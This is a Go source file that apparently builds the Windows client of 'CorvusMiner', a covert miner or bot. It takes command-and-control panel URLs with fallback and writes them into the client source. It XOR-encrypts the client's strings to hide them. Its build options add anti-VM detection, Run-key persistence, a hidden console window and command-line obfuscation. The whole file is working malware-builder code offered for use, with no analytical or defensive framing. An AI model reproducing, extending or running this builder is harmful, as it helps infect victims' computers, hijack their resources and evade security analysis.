package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Windows builder - builds for Windows natively using Visual Studio/MSBuild

// checkWindowsDependencies verifies Visual Studio/CMake and build tools are installed
func checkWindowsDependencies() error {
	logInfo("Checking Windows build dependencies...")

	deps := []string{
		"cmake",
	}

	for _, dep := range deps {
		cmd := exec.Command("where", dep)
		if err := cmd.Run(); err != nil {
			logError("%s not found. Install from: https://cmake.org/download/", dep)
			return err
		}
	}

	// Check for Visual Studio or MSBuild
	if err := checkVisualStudioOrMSBuild(); err != nil {
		return err
	}

	logInfo("All dependencies found")
	return nil
}

// checkVisualStudioOrMSBuild checks for Visual Studio or standalone MSBuild
func checkVisualStudioOrMSBuild() error {
	// Check for MSBuild in Visual Studio locations
	vsLocations := []string{
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
	}

	for _, vsPath := range vsLocations {
		if _, err := os.Stat(vsPath); err == nil {
			logInfo("Found MSBuild at: %s", vsPath)
			return nil
		}
	}

	// Try where command
	cmd := exec.Command("where", "msbuild.exe")
	if err := cmd.Run(); err == nil {
		logInfo("Found MSBuild in PATH")
		return nil
	}

	return fmt.Errorf("Visual Studio or MSBuild not found. Install Visual Studio Community 2026, 2022, or 2019")
}

// buildClientNonInteractiveWindows builds using command-line flags
func buildClientNonInteractiveWindows() error {
	logInfo("CorvusMiner Builder - Non-Interactive Mode (Windows)")

	// Check dependencies first
	if err := checkWindowsDependencies(); err != nil {
		return fmt.Errorf("dependency check failed: %v", err)
	}

	panelURL := *panelURLFlag
	processMonitoring := *monitoringFlag
	debugConsole := *debugFlag
	antiVM := *antiVMFlag
	persistence := *persistenceFlag

	urlCount := len(strings.Split(panelURL, ","))
	logInfo("Using %d panel URL(s) with fallback support", urlCount)

	logInfo("Configuration:")
	logInfo("  Panel URL: %s", panelURL)
	logInfo("  Process Monitoring: %v", processMonitoring)
	logInfo("  Debug Console: %v", debugConsole)
	logInfo("  Anti-VM Detection: %v", antiVM)
	logInfo("  Persistence: %v", persistence)

	return executeBuildWindows(panelURL, processMonitoring, debugConsole, antiVM, persistence)
}

// buildClientWindows orchestrates the full build pipeline for Windows
func buildClientWindows() error {
	logInfo("CorvusMiner Builder - Windows Version")

	// Check dependencies first
	if err := checkWindowsDependencies(); err != nil {
		return fmt.Errorf("dependency check failed: %v", err)
	}

	// Get panel URL(s) from user
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter panel URL(s) separated by commas for fallback (e.g., http://panel1.com/api,http://panel2.com/api): ")
	panelURL, _ := reader.ReadString('\n')
	panelURL = strings.TrimSpace(panelURL)

	if panelURL == "" {
		return fmt.Errorf("panel URL cannot be empty")
	}

	// Validate URLs
	urlCount := len(strings.Split(panelURL, ","))
	logInfo("Using %d panel URL(s) with fallback support", urlCount)

	// Get monitoring preference
	fmt.Print("Enable process monitoring and command-line obfuscation? (y/n): ")
	monitorInput, _ := reader.ReadString('\n')
	processMonitoring := strings.TrimSpace(monitorInput) == "y"

	// Get debug console preference
	fmt.Print("Enable debug console? (y/n): ")
	debugInput, _ := reader.ReadString('\n')
	debugConsole := strings.TrimSpace(debugInput) == "y"

	// Get anti-VM preference
	fmt.Print("Enable anti-VM detection? (y/n): ")
	antiVMInput, _ := reader.ReadString('\n')
	antiVM := strings.TrimSpace(antiVMInput) == "y"

	// Get persistence preference
	fmt.Print("Enable persistence (Run key)? (y/n): ")
	persistenceInput, _ := reader.ReadString('\n')
	persistence := strings.TrimSpace(persistenceInput) == "y"

	logInfo("Configuration:")
	logInfo("  Panel URL: %s", panelURL)
	logInfo("  Process Monitoring: %v", processMonitoring)
	logInfo("  Debug Console: %v", debugConsole)
	logInfo("  Anti-VM Detection: %v", antiVM)
	logInfo("  Persistence: %v", persistence)

	return executeBuildWindows(panelURL, processMonitoring, debugConsole, antiVM, persistence)
}

// executeBuildWindows performs the actual build process on Windows
func executeBuildWindows(panelURL string, processMonitoring, debugConsole, antiVM, persistence bool) error {
	// Clean build directory first to ensure no stale CMake cache or files
	logInfo("Cleaning build directory: %s", buildDir)
	if err := os.RemoveAll(buildDir); err != nil {
		logError("Warning: Failed to remove build directory: %v", err)
	}
	if err := os.MkdirAll(buildDir, 0755); err != nil {
		return fmt.Errorf("failed to create build directory: %v", err)
	}

	// Backup source files
	backupDir := filepath.Join(clientDir, "backup")
	logInfo("Backing up source files to %s", backupDir)
	if err := backupSourceFiles(backupDir); err != nil {
		return fmt.Errorf("backup failed: %v", err)
	}
	defer func() {
		if err := restoreSourceFiles(backupDir); err != nil {
			logError("Failed to restore source files: %v", err)
		}
	}()

	// Generate XOR key
	xorKey := generateXORKey(32)
	logInfo("Generated XOR key (base64): %s", xorKey)

	// Inject encryption key into header
	if err := injectEncryptionKey(xorKey); err != nil {
		return fmt.Errorf("failed to inject encryption key: %v", err)
	}

	// Modify panel URL BEFORE encryption
	srcFile := filepath.Join(clientDir, "src", "main.cpp")
	logInfo("Setting panel URL to: %s", panelURL)
	if err := modifyPanelURL(srcFile, panelURL); err != nil {
		return fmt.Errorf("failed to modify panel URL: %v", err)
	}

	// Decode key for string encryption
	keyBytes, err := base64.StdEncoding.DecodeString(xorKey)
	if err != nil {
		return fmt.Errorf("failed to decode XOR key: %v", err)
	}

	// Encrypt strings in source files (including the modified panel URL)
	logInfo("Encrypting strings in source files...")
	if err := encryptSourceStrings(keyBytes); err != nil {
		return fmt.Errorf("string encryption failed: %v", err)
	}

	// DEBUG: Verify the file was actually modified
	debugContent, _ := os.ReadFile(filepath.Join(clientDir, "src", "main.cpp"))
	debugStr := string(debugContent)
	if strings.Contains(debugStr, "DecryptString(__ENCRYPTED_") {
		logInfo("✓ VERIFIED: main.cpp contains DecryptString calls")
	} else {
		logError("✗ WARNING: main.cpp does NOT contain DecryptString calls!")
		logError("First 500 chars: %s", debugStr[:min(500, len(debugStr))])
	}

	// Toggle WIN32 flag for debug console
	if debugConsole {
		logInfo("Enabling debug console...")
	} else {
		logInfo("Disabling debug console (hiding window)...")
	}
	if err := toggleWin32Flag(debugConsole); err != nil {
		return fmt.Errorf("failed to toggle WIN32 flag: %v", err)
	}

	// Run CMake
	logInfo("Configuring project with CMake...")
	if err := runCMakeWindows(antiVM, persistence, debugConsole); err != nil {
		return fmt.Errorf("CMake configuration failed: %v", err)
	}

	// Run MSBuild
	logInfo("Building project...")
	if err := runMSBuild(); err != nil {
		return fmt.Errorf("build failed: %v", err)
	}

	logSuccess("Build completed successfully!")
	logInfo("Output: %s/corvus.exe", buildDir)

	// If output flag is set, copy binary to specified location
	if *outputFlag != "" {
		srcBinary := filepath.Join(buildDir, "Release", "corvus.exe")
		if _, err := os.Stat(srcBinary); err != nil {
			// Try Debug folder if Release doesn't exist
			srcBinary = filepath.Join(buildDir, "Debug", "corvus.exe")
		}

		dstBinary := filepath.Join(*outputFlag, "corvus.exe")

		// Create output directory if it doesn't exist
		if err := os.MkdirAll(*outputFlag, 0755); err != nil {
			return fmt.Errorf("failed to create output directory: %v", err)
		}

		// Copy binary
		if err := copyFile(srcBinary, dstBinary); err != nil {
			return fmt.Errorf("failed to copy binary to output: %v", err)
		}

		logSuccess("Binary copied to: %s", dstBinary)
	}

	return nil
}

// runCMakeWindows runs CMake for Windows with Visual Studio generator
func runCMakeWindows(antiVM bool, persistence bool, debugConsole bool) error {
	// List of generators to try in order
	generators := []string{
		"Visual Studio 17 2022",
		"Visual Studio 16 2019",
	}

	var lastErr error
	for i, generator := range generators {
		args := []string{
			"-G", generator,
			"-A", "x64",
			"-DCMAKE_BUILD_TYPE=Release",
		}

		if antiVM {
			args = append(args, "-DENABLE_ANTIVM=ON")
		}

		if persistence {
			args = append(args, "-DENABLE_PERSISTENCE=ON")
		}

		if debugConsole {
			args = append(args, "-DENABLE_DEBUG_CONSOLE=ON")
		}

		args = append(args, "..")

		// Clean CMake cache if not the first attempt
		if i > 0 {
			logInfo("Cleaning CMake cache before trying %s...", generator)
			os.RemoveAll(filepath.Join(buildDir, "CMakeCache.txt"))
			os.RemoveAll(filepath.Join(buildDir, "CMakeFiles"))
		}

		cmd := exec.Command("cmake", args...)
		cmd.Dir = buildDir
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		if i == 0 {
			logInfo("Running CMake in %s with %s", buildDir, generator)
		} else {
			logInfo("Trying alternate generator: %s", generator)
		}

		if err := cmd.Run(); err != nil {
			lastErr = err
			continue // Try next generator
		}

		// Success
		return nil
	}

	// All generators failed
	if lastErr != nil {
		return fmt.Errorf("cmake error (tried VS2022 and VS2019): %v", lastErr)
	}
	return fmt.Errorf("cmake error: all generators failed")
}

// runMSBuild runs MSBuild to compile the project
func runMSBuild() error {
	// Try multiple possible solution file names
	possibleSolutions := []string{
		filepath.Join(buildDir, "corvus.sln"),
		filepath.Join(buildDir, "CorvusMiner.sln"),
		filepath.Join(buildDir, "project.sln"),
	}

	var slnFile string
	for _, candidate := range possibleSolutions {
		if _, err := os.Stat(candidate); err == nil {
			slnFile = candidate
			break
		}
	}

	if slnFile == "" {
		// List available files for debugging
		logError("Solution file not found. Checked: %v", possibleSolutions)
		entries, err := os.ReadDir(buildDir)
		if err == nil {
			logError("Files in build directory:")
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".sln") {
					logError("  - %s", entry.Name())
				}
			}
		}
		return fmt.Errorf("solution file not found in %s", buildDir)
	}

	logInfo("Using solution file: %s", slnFile)

	// Find MSBuild executable
	msbuildPath := findMSBuild()
	if msbuildPath == "" {
		return fmt.Errorf("MSBuild not found in PATH or Visual Studio installation directories")
	}

	logInfo("Using MSBuild: %s", msbuildPath)

	// Run MSBuild with Release configuration
	cmd := exec.Command(msbuildPath, slnFile, "/p:Configuration=Release", "/p:Platform=x64", "/m")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	logInfo("Running MSBuild...")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("msbuild error: %v", err)
	}

	return nil
}

// findMSBuild locates the MSBuild executable
func findMSBuild() string {
	// Try standard Visual Studio locations (newest first)
	vsLocations := []string{
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2026\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\MSBuild\\Current\\Bin\\MSBuild.exe",
		"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\MSBuild\\Current\\Bin\\MSBuild.exe",
	}

	for _, path := range vsLocations {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}

	// Try PATH
	cmd := exec.Command("where", "msbuild.exe")
	if output, err := cmd.Output(); err == nil {
		return strings.TrimSpace(string(output))
	}

	return ""
}

// windowsMain is the main entry point for Windows builds
func windowsMain() {
	if err := buildClientWindows(); err != nil {
		logError("Build failed: %v", err)
		os.Exit(1)
	}
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
